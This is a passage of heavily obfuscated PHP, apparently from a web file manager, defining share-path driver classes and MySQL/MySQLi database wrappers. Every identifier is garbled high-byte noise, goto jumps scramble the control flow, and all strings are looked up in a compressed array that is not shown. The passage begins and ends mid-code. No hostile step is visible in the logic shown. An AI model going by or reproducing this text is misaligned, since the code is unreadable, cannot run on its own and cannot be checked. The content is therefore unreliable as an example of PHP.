F¡ûÉ¬÷çå: define($_SERVER[ú∫][0], $_SERVER[ú∫][1]); $_SERVER[° ∑‡úÜ¿Õ¯] = explode($_SERVER[ú∫][2], gzinflate(substr($_SERVER[ú∫][3], 10, -8))); function binCheckEq($E„†À◊øú‡, $b„≥∫∏°æ¨) { return $E„†À◊øú‡ == $b„≥∫∏°æ¨; } goto B˜¨‘˜ Øπ; Aµ£Í ÖıÖ: class PathDriverDriverShareItem { public function __construct($eá∫‘¿ß®È) { $this->pathParse = $eá∫‘¿ß®È; } public function __call($BŒÔ ¥≤è±, $bÉ—Ë˘¥à•) { $cæ∑œ®ùäÔ =& $_SERVER[ú∫]; if (method_exists($this, $BŒÔ ¥≤è±)) { return; } $bâÑããÁ¯  = call_user_func_array(array($cæ∑œ®ùäÔ[1215], $BŒÔ ¥≤è±), $bÉ—Ë˘¥à•); $cÏ∑êµ“§í = array($cæ∑œ®ùäÔ[1216], $cæ∑œ®ùäÔ[1217], $cæ∑œ®ùäÔ[1218], $cæ∑œ®ùäÔ[1219], $cæ∑œ®ùäÔ[518], $cæ∑œ®ùäÔ[520], $cæ∑œ®ùäÔ[1220], $cæ∑œ®ùäÔ[107], $cæ∑œ®ùäÔ[1221], $cæ∑œ®ùäÔ[1222]); if (in_array($BŒÔ ¥≤è±, $cÏ∑êµ“§í)) { $bâÑããÁ¯  = $this->getPathOuter($bâÑããÁ¯ ); } return $bâÑããÁ¯ ; } public function copy($C≠¨ªáŒ±ï, $DÆò£Í…æÕ, $fÁ±–ŸŸƒ· = false) { return $this->copyMove($C≠¨ªáŒ±ï, $DÆò£Í…æÕ, $fÁ±–ŸŸƒ·, $_SERVER[ú∫][518]); } public function move($aπ‘ÜìÜº°, $BÉØ⁄†ÊÓÎ, $aø⁄∑≥∫ãè = false) { return $this->copyMove($aπ‘ÜìÜº°, $BÉØ⁄†ÊÓÎ, $aø⁄∑≥∫ãè, $_SERVER[ú∫][520]); } private function copyMove($AŸ•˜æ‡‹í, $EÌ‡‹ÀÕŸò, $aÓ•Ù·ÒˆÃ, $Eäà¬Öì¥) { goto c¨àâüáœõ; Bêÿã–πÉ◊: return $Eƒ Ø÷—≥√; goto fà¿øóƒ£„; c¨àâüáœõ: $báÌè©ôïß =& $_SERVER[ú∫]; $A√°ÎÇöÂŒ = $EÌ‡‹ÀÕŸò; $D∆Õ®—‘¬§ = IO::driverMake($EÌ‡‹ÀÕŸò); goto EºÂÂ£‡«Ñ; EºÂÂ£‡«Ñ: if ($D∆Õ®—‘¬§->pathParse[$báÌè©ôïß[1048]]) { $EÌ‡‹ÀÕŸò = $D∆Õ®—‘¬§->pathParse[$báÌè©ôïß[1048]]; } else { $EÌ‡‹ÀÕŸò = $A√°ÎÇöÂŒ; } $Eƒ Ø÷—≥√ = IO::copyMove($AŸ•˜æ‡‹í, $EÌ‡‹ÀÕŸò, $aÓ•Ù·ÒˆÃ, $Eäà¬Öì¥); $Eƒ Ø÷—≥√ = $this->getPathOuter($Eƒ Ø÷—≥√); goto Bêÿã–πÉ◊; fà¿øóƒ£„: } public function pathThis($EÉ∞‘†ñ‹≠) { return get_path_this($this->pathParse[$_SERVER[ú∫][76]]); } public function pathFather($dÑ‘ΩâÒæü) { return get_path_father($this->pathParse[$_SERVER[ú∫][76]]); } public function iconvSystem($a¨Ç≈”€ª‘) { return $a¨Ç≈”€ª‘; } protected function infoParse($D◊â•ìÛË∑, $b‹Çº©∑âæ = false) { $Bâøîª°í¿ =& $_SERVER[ú∫]; $D·ãóÊ§£∆ = $this->pathParse[$Bâøîª°í¿[466]][$Bâøîª°í¿[1071]] . $this->pathParse[$Bâøîª°í¿[1064]]; if ($b‹Çº©∑âæ) { $d»Ú¨é⁄ﬂ¿ = IO::infoWithChildren($D·ãóÊ§£∆); } else { $d»Ú¨é⁄ﬂ¿ = IO::info($D·ãóÊ§£∆); } $A˘ô˘´Ã©– = $this->pathParse[$Bâøîª°í¿[466]]; return Action($Bâøîª°í¿[1214])->_shareItemeParse($d»Ú¨é⁄ﬂ¿, $A˘ô˘´Ã©–); } public function listAll($B≥ò◊Î¨–®) { $då¢Ççﬂ¥¥ =& $_SERVER[ú∫]; $BÒﬂñ⁄ç≤í = IO::listAll($B≥ò◊Î¨–®); $A∂ﬂ∑ﬁ•üé = $this->pathParse[$då¢Ççﬂ¥¥[466]]; foreach ($BÒﬂñ⁄ç≤í as &$f—èŸÆó›ª) { check_abort(); $eüö´ú‘µ˜ = IO::info($f—èŸÆó›ª[$då¢Ççﬂ¥¥[76]]); $eüö´ú‘µ˜ = is_array($eüö´ú‘µ˜) ? $eüö´ú‘µ˜ : array(); $f—èŸÆó›ª = array_merge($eüö´ú‘µ˜, $f—èŸÆó›ª); $f—èŸÆó›ª[$då¢Ççﬂ¥¥[85]] = Action($då¢Ççﬂ¥¥[1214])->_shareItemeParse($f—èŸÆó›ª, $A∂ﬂ∑ﬁ•üé); } unset($f—èŸÆó›ª); return $BÒﬂñ⁄ç≤í; } public function getPathOuter($E°ˆ∑–≈è√) { goto EÏ §ıúØÃ; b¥è£∂Ìçâ: if (substr($dâÓá¥‡ªœ, 0, strlen($d√É∞πí≥–)) != $d√É∞πí≥–) { return !1; } return $this->pathParse[$aêµã≈Ëì°[1065]] . $aêµã≈Ëì°[8] . ltrim($c“≠ÿïÃãä, $aêµã≈Ëì°[8]); goto d÷åŒ¢›¶ô; EÏ §ıúØÃ: $aêµã≈Ëì° =& $_SERVER[ú∫]; $F€ë¨Êüñ» = KodIO::parse($E°ˆ∑–≈è√); if ($F€ë¨Êüñ»[$aêµã≈Ëì°[29]] == KodIO::KOD_SHARE_ITEM) { return $F€ë¨Êüñ»[$aêµã≈Ëì°[76]]; } goto e—Ñ–æõ‚À; e—Ñ–æõ‚À: $dâÓá¥‡ªœ = KodIO::clear($E°ˆ∑–≈è√); $d√É∞πí≥– = KodIO::clear($this->pathParse[$aêµã≈Ëì°[466]][$aêµã≈Ëì°[1071]]); $c“≠ÿïÃãä = substr($dâÓá¥‡ªœ, strlen($d√É∞πí≥–)); goto b¥è£∂Ìçâ; d÷åŒ¢›¶ô: } public function getType() { $eëº∆‰úËÂ =& $_SERVER[ú∫]; $BÃπˆ‹˜©ü = str_replace($eëº∆‰úËÂ[72], $eëº∆‰úËÂ[33], get_class($this)); return strtolower($BÃπˆ‹˜©ü); } public function isTypeObject($c’Ë®Û«‰¥) { return IO::isTypeObject($c’Ë®Û«‰¥); } public function info($B∞Îàìì¶≥) { return $this->infoParse($B∞Îàìì¶≥); } public function infoAuth($e’ÃÀﬂ‚é˜) { return $this->infoParse($e’ÃÀﬂ‚é˜); } public function infoWithChildren($b”á ≈éÙ…) { return $this->infoParse($b”á ≈éÙ…, !0); } public function infoFull($Då¥µÃΩ±ñ) { return $this->infoParse($Då¥µÃΩ±ñ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bŸ˜Õ¡±ò‹) { $this->pathParse = $bŸ˜Õ¡±ò‹; } protected function infoParse($Dÿ≈ÃÇ≈‘Á, $E…Æ›œí∏ë = false) { $E´ÂæØÃï¬ =& $_SERVER[ú∫]; return Action($E´ÂæØÃï¬[1070])->sharePathInfo($this->pathParse[$E´ÂæØÃï¬[76]], !0, $E…Æ›œí∏ë); } public function listPath($BÕÿçù®éå, $DπÌ´ôÆ¿Ü = false) { $eäÆúÆÓåí =& $_SERVER[ú∫]; $aîœ±Ûœ‡è = IO::listPath($BÕÿçù®éå, $DπÌ´ôÆ¿Ü); foreach ($aîœ±Ûœ‡è as $A‚èÈ·âÈù => $DôÂîôˆ®∞) { if (!in_array($A‚èÈ·âÈù, array($eäÆúÆÓåí[74], $eäÆúÆÓåí[75]))) { continue; } foreach ($DôÂîôˆ®∞ as $EÚ˜ˆ—˘Á· => $D¿™€ó“Áÿ) { $D¿™€ó“Áÿ = Action($eäÆúÆÓåí[1223])->parsePathChildren($D¿™€ó“Áÿ, array($eäÆúÆÓåí[414] => $BÕÿçù®éå)); $aîœ±Ûœ‡è[$A‚èÈ·âÈù][$EÚ˜ˆ—˘Á·] = Action($eäÆúÆÓåí[1070])->shareItemInfo($D¿™€ó“Áÿ); } } return $aîœ±Ûœ‡è; } public function listAll($bƒÁò»¯•∑) { $eÁˆÒ¥Âñ∂ =& $_SERVER[ú∫]; $EÌ≤»Ñ⁄ü¡ = IO::listAll($bƒÁò»¯•∑); foreach ($EÌ≤»Ñ⁄ü¡ as &$A≈‘Ç€Ã≤ü) { $Fçè¯œÑ±Ÿ = IO::info($A≈‘Ç€Ã≤ü[$eÁˆÒ¥Âñ∂[76]]); $Fçè¯œÑ±Ÿ = is_array($Fçè¯œÑ±Ÿ) ? $Fçè¯œÑ±Ÿ : array(); $A≈‘Ç€Ã≤ü = array_merge($Fçè¯œÑ±Ÿ, $A≈‘Ç€Ã≤ü); $A≈‘Ç€Ã≤ü[$eÁˆÒ¥Âñ∂[85]] = Action($eÁˆÒ¥Âñ∂[1070])->shareItemInfo($A≈‘Ç€Ã≤ü); } unset($A≈‘Ç€Ã≤ü); return $EÌ≤»Ñ⁄ü¡; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($böîî›ïÖ) { parent::__construct($böîî›ïÖ); } } goto CóÖ«ûôêâ; dåœº«åó≤: class DbMysql extends Db { public function __construct($dëÃùΩ™∞À = '') { $fπ‡∂ó¶µ  =& $_SERVER[ú∫]; if (!extension_loaded($fπ‡∂ó¶µ [759])) { think_exception(think_lang($fπ‡∂ó¶µ [10]) . $fπ‡∂ó¶µ [845]); } if (!empty($dëÃùΩ™∞À)) { $this->config = $dëÃùΩ™∞À; if (empty($this->config[$fπ‡∂ó¶µ [13]])) { $this->config[$fπ‡∂ó¶µ [13]] = $fπ‡∂ó¶µ [33]; } } } public function connect($fÂﬂ„≠¢ãÇ = '', $cﬂ¿ﬂõ®Ü◊ = 0, $føÇâ·“¢« = false) { $då˜ñùπ´» =& $_SERVER[ú∫]; if (!isset($this->linkID[$cﬂ¿ﬂõ®Ü◊])) { goto CÿïçâËïå; f©’ü‰≈ä≈: if (1 != think_config($då˜ñùπ´»[18])) { unset($this->config); } goto bòüÆäËè≠; CÿïçâËïå: if (empty($fÂﬂ„≠¢ãÇ)) { $fÂﬂ„≠¢ãÇ = $this->config; } $F·⁄€ÊΩ¢™ = $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[846]] . ($fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[847]] ? "\x3a{$fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[847]]}" : $då˜ñùπ´»[33]); $CÇﬂ· †ºÙ = !empty($fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[13]][$då˜ñùπ´»[14]]) ? $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[13]][$då˜ñùπ´»[14]] : $this->pconnect; goto F»˘õí†åò; c≥‚”õÂ∆: mysql_query($då˜ñùπ´»[850] . think_config($då˜ñùπ´»[851]) . $då˜ñùπ´»[55], $this->linkID[$cﬂ¿ﬂõ®Ü◊]); if ($aæ€˘ƒ‘Œ› > $då˜ñùπ´»[852]) { mysql_query($då˜ñùπ´»[853], $this->linkID[$cﬂ¿ﬂõ®Ü◊]); } $this->connected = !0; goto f©’ü‰≈ä≈; F»˘õí†åò: if ($CÇﬂ· †ºÙ) { $this->linkID[$cﬂ¿ﬂõ®Ü◊] = mysql_pconnect($F·⁄€ÊΩ¢™, $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[848]], $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[849]], 131072); } else { $this->linkID[$cﬂ¿ﬂõ®Ü◊] = mysql_connect($F·⁄€ÊΩ¢™, $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[848]], $fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[849]], !0, 131072); } if (!$this->linkID[$cﬂ¿ﬂõ®Ü◊] || !empty($fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[17]]) && !mysql_select_db($fÂﬂ„≠¢ãÇ[$då˜ñùπ´»[17]], $this->linkID[$cﬂ¿ﬂõ®Ü◊])) { think_exception(mysql_error()); } $aæ€˘ƒ‘Œ› = mysql_get_server_info($this->linkID[$cﬂ¿ﬂõ®Ü◊]); goto c≥‚”õÂ∆; bòüÆäËè≠: } return $this->linkID[$cﬂ¿ﬂõ®Ü◊]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eúñº»ï¯≠) { goto AáŸ™≈’Óı; AáŸ™≈’Óı: $BÊ»£çÑŒ‚ =& $_SERVER[ú∫]; if (0 === stripos($eúñº»ï¯≠, $BÊ»£çÑŒ‚[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fÕéÕìêçÕ; Bµƒ–ó¬åª: think_action_status($BÊ»£çÑŒ‚[19], 1); think_status($BÊ»£çÑŒ‚[20]); $this->queryID = mysql_query($eúñº»ï¯≠, $this->_linkID); goto aŸÆÌ“åÜè; aŸÆÌ“åÜè: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c®Îí™‰áé; fÕéÕìêçÕ: if (!$this->_linkID) { return !1; } $this->queryStr = $eúñº»ï¯≠; if ($this->queryID) { $this->free(); } goto Bµƒ–ó¬åª; c®Îí™‰áé: } public function execute($CÁä∫Îèı) { goto A∫πﬁæÚ∞∏; A∫πﬁæÚ∞∏: $F∑ìøºüÓ≈ =& $_SERVER[ú∫]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e›Âã•ΩÓ“; e›Âã•ΩÓ“: $this->queryStr = $CÁä∫Îèı; if ($this->queryID) { $this->free(); } think_action_status($F∑ìøºüÓ≈[21], 1); goto cà‹¨«€≥á; cà‹¨«€≥á: think_status($F∑ìøºüÓ≈[20]); $AÁç”∑â§ = mysql_query($CÁä∫Îèı, $this->_linkID); $this->debug(); goto EÖñ“ôÕµà; EÖñ“ôÕµà: if (!1 === $AÁç”∑â§) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dàïïõ¶ëï; dàïïõ¶ëï: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ú∫][854], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F∂ãÈ‚§©ß = mysql_query($_SERVER[ú∫][855], $this->_linkID); $this->transTimes = 0; if (!$F∂ãÈ‚§©ß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÃ¡ê‚ê§∑ = mysql_query($_SERVER[ú∫][856], $this->_linkID); $this->transTimes = 0; if (!$CÃ¡ê‚ê§∑) { $this->error(); return !1; } } return !0; } private function getAll() { $E…üœ∑π÷™ = array(); if ($this->numRows > 0) { while ($Bì‘≠ÕÖ„‡ = mysql_fetch_assoc($this->queryID)) { $E…üœ∑π÷™[] = $Bì‘≠ÕÖ„‡; } mysql_data_seek($this->queryID, 0); } return $E…üœ∑π÷™; } public function getFields($fÂ‘«Œçêﬂ) { $C¨í◊ó≠Çä =& $_SERVER[ú∫]; $fﬂè© Í«§ = $this->query($C¨í◊ó≠Çä[857] . $this->parseKey($fÂ‘«Œçêﬂ)); $Fö˜°‰’≈é = array(); if ($fﬂè© Í«§) { foreach ($fﬂè© Í«§ as $Fﬂ±Õ∆’§ê => $DßíëÃ∂≤Ç) { $Fö˜°‰’≈é[$DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[27]]] = array($C¨í◊ó≠Çä[28] => $DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[27]], $C¨í◊ó≠Çä[29] => $DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[30]], $C¨í◊ó≠Çä[31] => (bool) (strtoupper($DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[32]]) === $C¨í◊ó≠Çä[858]), $C¨í◊ó≠Çä[34] => $DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[35]], $C¨í◊ó≠Çä[36] => strtolower($DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[37]]) == $C¨í◊ó≠Çä[38], $C¨í◊ó≠Çä[39] => strtolower($DßíëÃ∂≤Ç[$C¨í◊ó≠Çä[40]]) == $C¨í◊ó≠Çä[41]); } } return $Fö˜°‰’≈é; } public function getTables($a√£œèî®» = '') { $Dµ¿Òá∑µ‡ =& $_SERVER[ú∫]; if (!empty($a√£œèî®»)) { $Eàã˜√õÓù = $Dµ¿Òá∑µ‡[859] . $a√£œèî®» . $Dµ¿Òá∑µ‡[860]; } else { $Eàã˜√õÓù = $Dµ¿Òá∑µ‡[861]; } $dÛíÕàÉóô = $this->query($Eàã˜√õÓù); $cåïƒöÊê† = array(); foreach ($dÛíÕàÉóô as $fÑÿ√â¡©÷ => $B˜á≈ïíœ ) { $cåïƒöÊê†[$fÑÿ√â¡©÷] = current($B˜á≈ïíœ ); } return $cåïƒöÊê†; } public function replace($C≥µΩ≠Û∫ù, $Fºûé”∏÷π = array()) { $dÔ˘Ÿ´≥à‘ =& $_SERVER[ú∫]; foreach ($C≥µΩ≠Û∫ù as $D‹«ﬂ◊°√— => $eÍÑï⁄¥·Ó) { $d•ëÁçÊ›ﬁ = $this->parseValue($eÍÑï⁄¥·Ó); if (is_scalar($d•ëÁçÊ›ﬁ)) { $aØáıá–»†[] = $d•ëÁçÊ›ﬁ; $C∆∫œ≤∆Ω›[] = $this->parseKey($D‹«ﬂ◊°√—); } } $A™ç‘ü£œ‚ = $dÔ˘Ÿ´≥à‘[862] . $this->parseTable($Fºûé”∏÷π[$dÔ˘Ÿ´≥à‘[277]]) . $dÔ˘Ÿ´≥à‘[863] . implode($dÔ˘Ÿ´≥à‘[47], $C∆∫œ≤∆Ω›) . $dÔ˘Ÿ´≥à‘[864] . implode($dÔ˘Ÿ´≥à‘[47], $aØáıá–»†) . $dÔ˘Ÿ´≥à‘[865]; return $this->execute($A™ç‘ü£œ‚); } public function insertAll($dÉË€ª£¯á, $D–êΩÔ≠¢ = array(), $bËú—ûà≠◊ = false) { goto Cìä—öËº; Cìä—öËº: $EÉ›≥¥ÛØÊ =& $_SERVER[ú∫]; if (!is_array($dÉË€ª£¯á[0])) { return !1; } $EÛ…¡Íüÿ¥ = array_keys($dÉË€ª£¯á[0]); goto BÚ”äÁ’àî; BÚ”äÁ’àî: $c§ÒÛ«äøﬂ = array(); foreach ($dÉË€ª£¯á as $b–ªÒ∫œøè) { $Aóöı™ê ∏ = array(); foreach ($b–ªÒ∫œøè as $a”ÀøÁå¨é => $b…≤€’ê“û) { $b…≤€’ê“û = $this->parseValue($b…≤€’ê“û); if (is_scalar($b…≤€’ê“û)) { $Aóöı™ê ∏[] = $b…≤€’ê“û; } } $c§ÒÛ«äøﬂ[] = $EÉ›≥¥ÛØÊ[258] . implode($EÉ›≥¥ÛØÊ[47], $Aóöı™ê ∏) . $EÉ›≥¥ÛØÊ[865]; } array_walk($EÛ…¡Íüÿ¥, array($this, $EÉ›≥¥ÛØÊ[866])); goto cºÉ‚„¿“è; cºÉ‚„¿“è: $FÕ‘ñ´êÑ• = ($bËú—ûà≠◊ ? $EÉ›≥¥ÛØÊ[867] : $EÉ›≥¥ÛØÊ[868]) . $EÉ›≥¥ÛØÊ[869] . $this->parseTable($D–êΩÔ≠¢[$EÉ›≥¥ÛØÊ[277]]) . $EÉ›≥¥ÛØÊ[863] . implode($EÉ›≥¥ÛØÊ[47], $EÛ…¡Íüÿ¥) . $EÉ›≥¥ÛØÊ[870] . implode($EÉ›≥¥ÛØÊ[47], $c§ÒÛ«äøﬂ); return $this->execute($FÕ‘ñ´êÑ•); goto a∏—Êπ¯ºº; a∏—Êπ¯ºº: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $DŸªﬂ©∫òÚ =& $_SERVER[ú∫]; $this->error = mysql_errno() . $DŸªﬂ©∫òÚ[4] . mysql_error($this->_linkID); if ($DŸªﬂ©∫òÚ[33] != $this->queryStr) { $this->error .= LNG($DŸªﬂ©∫òÚ[45]) . $this->queryStr; } think_trace($this->error, $DŸªﬂ©∫òÚ[33], $DŸªﬂ©∫òÚ[46]); return $this->error; } public function escapeString($EÖ«∆º™‚Ø) { if ($this->_linkID) { return mysql_real_escape_string($EÖ«∆º™‚Ø, $this->_linkID); } else { return mysql_escape_string($EÖ«∆º™‚Ø); } } public function parseKey(&$d·À›çµÍ¢, $dÏåâÂÎ¥∂ = true) { $eÖπŸÂÊÑÿ =& $_SERVER[ú∫]; if ($dÏåâÂÎ¥∂) { $d·À›çµÍ¢ = $this->parseKeyCheck($d·À›çµÍ¢); } if ($d·À›çµÍ¢ != $eÖπŸÂÊÑÿ[182] && !preg_match($eÖπŸÂÊÑÿ[871], $d·À›çµÍ¢)) { $d·À›çµÍ¢ = $eÖπŸÂÊÑÿ[382] . trim($d·À›çµÍ¢, $eÖπŸÂÊÑÿ[382]) . $eÖπŸÂÊÑÿ[382]; } return $d·À›çµÍ¢; } } class DbMysqli extends Db { public function __construct($D·êﬂΩâË∑ = '') { $dò”Ω‚⁄äπ =& $_SERVER[ú∫]; if (!extension_loaded($dò”Ω‚⁄äπ[758])) { think_exception(think_lang($dò”Ω‚⁄äπ[10]) . $dò”Ω‚⁄äπ[872]); } if (!empty($D·êﬂΩâË∑)) { $this->config = $D·êﬂΩâË∑; if (empty($this->config[$dò”Ω‚⁄äπ[13]])) { $this->config[$dò”Ω‚⁄äπ[13]] = $dò”Ω‚⁄äπ[33]; } } } public function connect($e⁄éÜ–£Âê = '', $bπ√ˆ∂®ñ› = 0) { $bÓ¿∞—ìÌ =& $_SERVER[ú∫]; if (!isset($this->linkID[$bπ√ˆ∂®ñ›])) { goto a∫≥¨Îùîå; d∞∫ú›¬”Â: $this->connected = !0; if (1 != think_config($bÓ¿∞—ìÌ[18])) { unset($this->config); } goto DãÓ‘æŒÈ; a∫≥¨Îùîå: if (empty($e⁄éÜ–£Âê)) { $e⁄éÜ–£Âê = $this->config; } $this->linkID[$bπ√ˆ∂®ñ›] = new mysqli($e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[846]], $e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[848]], $e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[849]], $e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[17]], $e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[847]] ? intval($e⁄éÜ–£Âê[$bÓ¿∞—ìÌ[847]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cŸä–ÑÎ—´; cŸä–ÑÎ—´: $b∆Öî∞å±¯ = $this->linkID[$bπ√ˆ∂®ñ›]->server_version; $this->linkID[$bπ√ˆ∂®ñ›]->query($bÓ¿∞—ìÌ[850] . think_config($bÓ¿∞—ìÌ[851]) . $bÓ¿∞—ìÌ[55]); if ($b∆Öî∞å±¯ > $bÓ¿∞—ìÌ[852]) { $this->linkID[$bπ√ˆ∂®ñ›]->query($bÓ¿∞—ìÌ[853]); } goto d∞∫ú›¬”Â; DãÓ‘æŒÈ: } return $this->linkID[$bπ√ˆ∂®ñ›]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fåÜñ“ù√¢) { goto e∂¢Óø˜€÷; e∂¢Óø˜€÷: $cﬁõ¿ˆàœà =& $_SERVER[ú∫]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A€≠Ò§Ô†€; A€≠Ò§Ô†€: $this->queryStr = $fåÜñ“ù√¢; if ($this->queryID) { $this->free(); } think_action_status($cﬁõ¿ˆàœà[19], 1); goto B’“ä™èÆ◊; B’“ä™èÆ◊: think_status($cﬁõ¿ˆàœà[20]); $this->queryID = $this->_linkID->query($fåÜñ“ù√¢); if ($this->_linkID->more_results()) { while (($dÖß·ÊÂÇ = $this->_linkID->next_result()) != NULL) { $dÖß·ÊÂÇ->free_result(); } } goto b£ƒõﬂÌà¬; b£ƒõﬂÌà¬: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¢úêê‹Üø; F¢úêê‹Üø: } public function execute($EÈÇªÊ›áÀ) { goto a±¢„ôØ¡Ã; aïò∫∫‚¥â: think_status($cÜ¡ÓÁÖ∆≤[20]); $C„‰àæÑ∂¥ = $this->_linkID->query($EÈÇªÊ›áÀ); $this->debug(); goto B¢—Öã¨∞È; aù˜∑°¿ãÇ: $this->queryStr = $EÈÇªÊ›áÀ; if ($this->queryID) { $this->free(); } think_action_status($cÜ¡ÓÁÖ∆≤[21], 1); goto aïò∫∫‚¥â; a±¢„ôØ¡Ã: $cÜ¡ÓÁÖ∆≤ =& $_SERVER[ú∫]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aù˜∑°¿ãÇ; B¢—Öã¨∞È: if (!1 === $C„‰àæÑ∂¥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eòÜµù»±¿; eòÜµù»±¿: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fﬁè‰”Çêå = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Fﬁè‰”Çêå) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FèüÍÈ°Û = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FèüÍÈ°Û) { $this->error(); return !1; } } return !0; } private function getAll() { $B•√Ïà·…√ = array(); if ($this->numRows > 0) { for ($F¥ãö••∞ = 0; $F¥ãö••∞ < $this->numRows; $F¥ãö••∞++) { $B•√Ïà·…√[$F¥ãö••∞] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B•√Ïà·…√; } public function getFields($Cø«ô≥ƒïÖ) { $fŸú›Ì∆äÕ =& $_SERVER[ú∫]; $b¶åÑΩùÌÖ = $this->query($fŸú›Ì∆äÕ[857] . $this->parseKey($Cø«ô≥ƒïÖ)); $E“À∫…ã™ã = array(); if ($b¶åÑΩùÌÖ) { foreach ($b¶åÑΩùÌÖ as $AË÷⁄∏·´∆ => $AîßÓµ—Ùµ) { $E“À∫…ã™ã[$AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[27]]] = array($fŸú›Ì∆äÕ[28] => $AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[27]], $fŸú›Ì∆äÕ[29] => $AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[30]], $fŸú›Ì∆äÕ[31] => (bool) ($AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[32]] === $fŸú›Ì∆äÕ[33]), $fŸú›Ì∆äÕ[34] => $AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[35]], $fŸú›Ì∆äÕ[36] => strtolower($AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[37]]) == $fŸú›Ì∆äÕ[38], $fŸú›Ì∆äÕ[39] => strtolower($AîßÓµ—Ùµ[$fŸú›Ì∆äÕ[40]]) == $fŸú›Ì∆äÕ[41]); } } return $E“À∫…ã™ã; } public function getTables($b√ˆõ€ºáÔ = '') { $B©°áçÒ∏Ö =& $_SERVER[ú∫]; $DÍ≥⁄ıÊá∫ = !empty($b√ˆõ€ºáÔ) ? $B©°áçÒ∏Ö[859] . $b√ˆõ€ºáÔ . $B©°áçÒ∏Ö[860] : $B©°áçÒ∏Ö[861]; $cÖÉ◊â€ßã = $this->query($DÍ≥⁄ıÊá∫); $c◊◊êπ∑ƒ≠ = array(); if ($cÖÉ◊â€ßã) { foreach ($cÖÉ◊â€ßã as $fà¶∏Ö⁄åÊ => $fıí·ñù∫ï) { $c◊◊êπ∑ƒ≠[$fà¶∏Ö⁄åÊ] = current($fıí·ñù∫ï); } } return $c◊◊êπ∑ƒ≠; } public function replace($FîãÜêëË≈, $aã≥“≤à¨ó = array()) { $E√ªë¶åÇÙ =& $_SERVER[ú∫]; foreach ($FîãÜêëË≈ as $B»ﬂ¶èﬁø… => $A‡èë°›π÷) { $aﬁ¯ãÏáÒâ = $this->parseValue($A‡èë°›π÷); if (is_scalar($aﬁ¯ãÏáÒâ)) { $fà¯Ñ◊Ô±Ø[] = $aﬁ¯ãÏáÒâ; $Eº∏í°õöº[] = $this->parseKey($B»ﬂ¶èﬁø…); } } $bµ„û··üØ = $E√ªë¶åÇÙ[862] . $this->parseTable($aã≥“≤à¨ó[$E√ªë¶åÇÙ[277]]) . $E√ªë¶åÇÙ[863] . implode($E√ªë¶åÇÙ[47], $Eº∏í°õöº) . $E√ªë¶åÇÙ[864] . implode($E√ªë¶åÇÙ[47], $fà¯Ñ◊Ô±Ø) . $E√ªë¶åÇÙ[865]; return $this->execute($bµ„û··üØ); } public function insertAll($EÍ⁄¿åïö¨, $aó¡÷°Ø– = array(), $dÒ—ı¥∆•î = false) { goto A¡·€ÖÁ∫≥; b‘ôËÚàÕ˜: $eëÊÇ∑πÏõ = array(); foreach ($EÍ⁄¿åïö¨ as $f¿™Ö√ûâå) { $aãï∫Ÿ±“ = array(); foreach ($f¿™Ö√ûâå as $A¢ﬁ´ •éê => $F≠ë€é≈ÉÜ) { $F≠ë€é≈ÉÜ = $this->parseValue($F≠ë€é≈ÉÜ); if (is_scalar($F≠ë€é≈ÉÜ)) { $aãï∫Ÿ±“[] = $F≠ë€é≈ÉÜ; } } $eëÊÇ∑πÏõ[] = $büÔíø≥£Ã[258] . implode($büÔíø≥£Ã[47], 